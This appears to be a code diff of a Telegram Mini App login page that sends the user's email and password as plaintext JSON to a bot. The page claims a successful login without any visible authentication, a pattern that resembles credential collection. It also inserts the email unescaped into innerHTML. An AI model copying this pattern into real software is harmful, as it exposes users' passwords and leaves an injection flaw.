@@ -38,31 +38,34 @@
     <input type="password" id="password" placeholder="Password" required><br>
     <button id="loginBtn">Login</button>
 
-   <script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
+   <div id="message"></div>
 
-    document.getElementById("loginBtn").addEventListener("click", submitLogin);
+<script>
+const tg = window.Telegram.WebApp;
+tg.expand();
 
-    function submitLogin() {
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
+document.getElementById("loginBtn").addEventListener("click", submitLogin);
 
-        if (!email || !password) {
-            alert("Please enter email and password!");
-            return;
-        }
+function submitLogin() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
 
-        // Send data to bot
-        const data = { email: email, password: password };
-        tg.sendData(JSON.stringify(data));
-
-        // Show success message
-        document.body.innerHTML = `
-            <h1>✅ Logged in successfully!</h1>
-            <p>Welcome, ${email}</p>
-        `;
+    if (!email || !password) {
+        alert("Please enter email and password!");
+        return;
     }
+
+    // Send data to bot
+    const data = { email: email, password: password };
+    tg.sendData(JSON.stringify(data));
+
+    // Show message inside the container
+    const messageDiv = document.getElementById("message");
+    messageDiv.innerHTML = `
+        <h1>✅ Logged in successfully!</h1>
+        <p>Welcome, ${email}</p>
+    `;
+}
 </script>
 
 </body>
